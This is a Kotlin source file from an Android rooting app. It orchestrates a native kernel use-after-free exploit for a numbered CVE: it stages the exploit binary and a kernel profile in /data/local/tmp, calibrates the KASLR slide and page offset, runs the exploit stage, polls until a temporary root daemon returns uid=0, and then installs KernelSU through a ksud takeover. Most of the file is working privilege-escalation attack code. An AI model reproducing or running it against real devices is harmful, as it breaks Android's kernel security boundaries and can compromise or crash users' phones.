package com.pyb110.onekey.ghost.engine

import android.content.Context
import com.pyb110.onekey.ghost.data.ProfileRepository
import com.pyb110.onekey.ghost.device.KernelProbe
import com.pyb110.onekey.ghost.ksu.KsudStage
import com.pyb110.onekey.ghost.native.KernelProfileSerializer
import dev.onekey.jb.ShizukuShell
import java.io.ByteArrayOutputStream
import java.io.DataOutputStream

/**
 * GhostKey CVE-2026-98260 后端适配器。
 * 原版通过 Shizuku UserService 承载；本 App 使用 StellarShell，
 * 因此只复用 GhostKey 的 native 可执行文件和内核 profile，不复制它的 AIDL/UI。
 */
object GhostKeyEngine {
    private const val BASE = "/data/local/tmp"
    private const val BIN = "ghostkey/ghostkey98260"

    /** null = 环境不满足，可回退 Onuce；true = 成功；false = 已尝试但失败。 */
    fun run(
        context: Context,
        pkg: String,
        kind: String,
        log: (String) -> Unit,
        stage: (String) -> Unit,
        progress: (Int) -> Unit,
        beforeNative: (() -> Unit)? = null,
    ): Boolean? {
        val release = KernelProbe.read().trim()
        if (release.isBlank() || release == "unknown") {
            log("GhostKey: 读取内核版本失败，跳过")
            return null
        }
        val profile = ProfileRepository(context).resolve(release) ?: run {
            log("GhostKey: 没有精确匹配 " + release + " 的内核 profile")
            return null
        }
        log("GhostKey: profile " + profile.release)

        val seccomp = ShizukuShell.run("grep -E '^Seccomp:' /proc/self/status 2>/dev/null", 10).output.trim()
        if (!seccomp.contains("Seccomp:\t0") && !seccomp.contains("Seccomp: 0")) {
            log("GhostKey: 当前 shell 不满足 Seccomp=0（" + seccomp + "），跳过")
            return null
        }

        stage("GhostKey 准备运行环境")
        progress(4)
        // 每次运行使用全新的 /data/local/tmp 目录。上一次成功运行会留下
        // root:root 0700 的固定目录，硬重启后 shell 无法 chmod/复用，正是
        // “工作目录创建失败”的来源。
        val wsName = "onekey-ghostkey-" + System.currentTimeMillis().toString(36) +
            "-" + (0..0xffff).random().toString(16)
        val ws = BASE + "/" + wsName
        val prepare = ShizukuShell.run(
            "rm -rf " + shq(ws) + " && mkdir -p " + shq(ws) + " && chmod 700 " + shq(ws) + " && echo PREP",
            30,
        )
        if (!prepare.output.contains("PREP")) {
            log("GhostKey: 工作目录创建失败 (" + ws + ")")
            return false
        }
        log("GhostKey: work=" + ws)

        val stale = ShizukuShell.run("pidof ghostkey98260 2>/dev/null; true", 10).output.trim()
        if (stale.isNotBlank()) {
            log("GhostKey: 检测到残留 native 进程 [" + stale + "]，必须硬重启后再试")
            return false
        }

        if (ShizukuShell.stageAsset(context, BIN, ws + "/ghostkey98260", 755).code != 0) {
            log("GhostKey: native 投放失败")
            return false
        }
        val profileBlob = withLengthPrefix(KernelProfileSerializer.serialize(profile))
        if (ShizukuShell.stageBytes(profileBlob, ws + "/profile.bin", 644).code != 0) {
            log("GhostKey: profile 投放失败")
            return false
        }
        val ksud = stageKsud(context, pkg, kind, ws, log)

        val sock = ws + "/root.sock"
        val stop = ws + "/root.stop"
        val ksuLog = ws + "/ksu_takeover.log"
        val env = buildString {
            append("CVE98260_HOME=").append(shq(ws)).append(' ')
            append("TMPDIR=").append(shq(ws)).append(' ')
            append("HOME=").append(shq(ws)).append(' ')
            append("PATH=/system/bin:/vendor/bin:/data/local/tmp").append(' ')
            append("PLANT_FAST=1").append(' ')
            append("PC98260_SOCK=").append(shq(sock)).append(' ')
            append("PC98260_STOP_FILE=").append(shq(stop)).append(' ')
            append("CVE98260_KSU_LOG=").append(shq(ksuLog)).append(' ')
            if (ksud != null) append("CVE98260_KSUD=").append(shq(ksud)).append(' ')
        }

        fun step(name: String, args: String, timeoutSec: Long): Int {
            stage("GhostKey " + name)
            val inner = "cat profile.bin | ./ghostkey98260 " + args
            val cmd = "cd " + shq(ws) + " && env " + env + " sh -c " + shq(inner) +
                " > " + shq(name + ".log") + " 2>&1; echo RC=\$?"
            val r = ShizukuShell.run(cmd, timeoutSec)
            log("GhostKey " + name + ": " + r.output.trim().take(500))
            return Regex("RC=(\\d+)").find(r.output)?.groupValues?.get(1)?.toIntOrNull() ?: -1
        }

        stage("GhostKey 校准 A")
        progress(12)
        val rcA = step("calibrate-a", "calibrate-a", 200)
        val slide = read(ws, "slide.txt")?.trim()?.takeIf { it.isNotEmpty() } ?: run {
            log("GhostKey: calibrate-a 未产生 slide（rc=" + rcA + "），回退 Onuce")
            return null
        }
        if (rcA != 0) log("GhostKey: calibrate-a rc=" + rcA + " 但已得到 slide，继续")
        log("GhostKey: slide=" + slide)
        val rawSlide = parseHexLong(slide)
        if (rawSlide == null) {
            log("GhostKey: 无法解析 slide（" + slide + "），回退 Onuce")
            return null
        }
        val alignedSlide = if ((rawSlide and 0x1fffffL) == 0L) {
            rawSlide
        } else {
            // Ace 6.12 实测 timer_link 采样点相对 2MB 边界有 0x14 偏差。
            // KASLR slide 必须 2MB 对齐，按最近边界校正。
            val low = rawSlide and 0x1fffffL
            if (low > 0x100000L) (rawSlide + 0x1fffffL) and 0x1fffffL.inv()
            else rawSlide and 0x1fffffL.inv()
        }
        if (alignedSlide != rawSlide) {
            log("GhostKey: slide 校正 " + slide + " -> 0x" + java.lang.Long.toHexString(alignedSlide) + "（2MB 对齐）")
        }
        val slideAligned = "0x" + java.lang.Long.toHexString(alignedSlide)
        log("GhostKey: slide=" + slideAligned)

        stage("GhostKey 校准 B")
        progress(28)
        val rcB = step("calibrate-b", "calibrate-b --slide " + shq(slideAligned), 260)
        val pageOffset = read(ws, "page_offset.txt")?.trim()?.takeIf { it.isNotEmpty() } ?: run {
            log("GhostKey: calibrate-b 未产生 page_offset（rc=" + rcB + "），回退 Onuce")
            return null
        }
        if (rcB != 0) log("GhostKey: calibrate-b rc=" + rcB + " 但已产生 page_offset，按 fallback 继续")
        log("GhostKey: page_offset=" + pageOffset)
        val offsetScore = read(ws, "page_offset.score")?.trim().orEmpty()
        log("GhostKey: page_offset.score=" + offsetScore.ifBlank { "<missing>" })
        if (offsetScore == "fallback") {
            log("GhostKey: page_offset 未真正校准（fallback），不进入 exploit；回退 Onuce")
            return null
        }

        stage("GhostKey 注入")
        progress(45)
        val exploitInner = "cat profile.bin | ./ghostkey98260 exploit --slide " + shq(slideAligned) +
            " --page-offset " + shq(pageOffset) + " --daemon-exit"
        beforeNative?.invoke()
        ShizukuShell.run(
            "cd " + shq(ws) + " && env " + env + " nohup sh -c " + shq(exploitInner) +
                " > exploit.log 2>&1 & echo STARTED",
            30,
        )
        var root = false
        var lastTail = ""
        for (i in 1..180) {
            Thread.sleep(1000)
            val nowTail = ShizukuShell.run("tail -n 12 " + shq(ws + "/exploit.log") + " 2>/dev/null", 5).output.trim()
            if (nowTail.isNotEmpty() && nowTail != lastTail) {
                lastTail = nowTail
                if (i % 5 == 0 || nowTail.contains("missed page") || nowTail.contains("failed")) {
                    log("GhostKey exploit: " + nowTail.take(900))
                }
            }
            if (nowTail.contains("missed page; holding zombie")) {
                log("GhostKey: UAF 未捕获且已驻留（missed page），立即停止等待；不要 kill 原生进程，必须硬重启后再试")
                return false
            }
            if (nowTail.contains("[task] leak failed")) {
                log("GhostKey: task leak 失败，立即停止等待；必须硬重启后再试")
                return false
            }
            if (i % 10 == 0) {
                log("GhostKey: 等待 rootd " + i + "s")
            }
            val id = ShizukuShell.run("cd " + shq(ws) + " && env " + env + " ./ghostkey98260 su -c id 2>&1", 10).output.trim()
            if (id.contains("uid=0")) {
                root = true
                log("GhostKey: 临时 root 已建立（" + id + "）")
                break
            }
        }
        if (!root) {
            log("GhostKey: rootd 等待超时（180s），不 kill 原生进程")
            val tail = ShizukuShell.run("tail -n 80 " + shq(ws + "/exploit.log") + " 2>/dev/null", 10).output.trim()
            if (tail.isNotBlank()) log("GhostKey exploit log:\n" + tail.take(2500))
            return false
        }
        progress(70)

        stage("GhostKey KSU 接管")
        var ksuRc = -1
        if (ksud != null) {
            ksuRc = step("ksu-takeover", "ksu-takeover", 180)
            log("GhostKey: ksu-takeover rc=" + ksuRc)
            if (ksuRc == 0) {
                // KSU/su 已接管。rootd 只是 UAF 临时通道，继续驻留会在
                // 后续使用中放大内核异常；用官方 rootd-stop 优雅退出，
                // 不做 SIGKILL、不清理仍在运行的 rootd。
                val stopRc = step("rootd-stop", "rootd-stop", 45)
                log("GhostKey: rootd-stop rc=" + stopRc)
            }
        } else {
            log("GhostKey: 无 ksud，跳过 KSU 接管；保留临时 root")
        }

        ShizukuShell.run("rm -f " + shq(ws + "/profile.bin") + " 2>/dev/null; true", 10)
        stage("GhostKey 越狱完成")
        progress(100)
        return true
    }

    private fun parseHexLong(value: String): Long? = runCatching {
        val v = value.trim()
        if (v.startsWith("0x", ignoreCase = true)) v.substring(2).toLong(16) else v.toLong()
    }.getOrNull()

    private fun withLengthPrefix(blob: ByteArray): ByteArray {
        val out = ByteArrayOutputStream()
        DataOutputStream(out).use { d ->
            d.writeInt(blob.size)
            d.write(blob)
        }
        return out.toByteArray()
    }

    private fun read(ws: String, name: String): String? = runCatching {
        ShizukuShell.readDeviceFile("$ws/$name").toString(Charsets.UTF_8)
    }.getOrNull() ?: runCatching {
        ShizukuShell.run("cat " + shq("$ws/$name") + " 2>/dev/null", 10).output
    }.getOrNull()?.takeIf { it.isNotBlank() }

    private fun stageKsud(context: Context, pkg: String, kind: String, ws: String, log: (String) -> Unit): String? {
        val file = runCatching { KsudStage.scanManagerLib(context.packageManager) }.getOrNull()?.first
        if (file != null && file.isFile) {
            val bytes = runCatching { file.readBytes() }.getOrNull()
            if (bytes != null && bytes.isNotEmpty() &&
                ShizukuShell.stageBytes(bytes, ws + "/ksud", 755).code == 0) {
                log("GhostKey: ksud 来自 " + file.absolutePath)
                return ws + "/ksud"
            }
        }
        val key = if (kind == "kernelsu") "official" else kind
        val fallback = runCatching { context.assets.open("core/ksud_" + key).use { it.readBytes() } }.getOrNull()
        if (fallback != null && ShizukuShell.stageBytes(fallback, ws + "/ksud", 755).code == 0) {
            log("GhostKey: ksud 使用内置组件 " + key)
            return ws + "/ksud"
        }
        log("GhostKey: 无法取得 ksud")
        return null
    }

    private fun shq(v: String): String = "'" + v.replace("'", "'\\''") + "'"
}
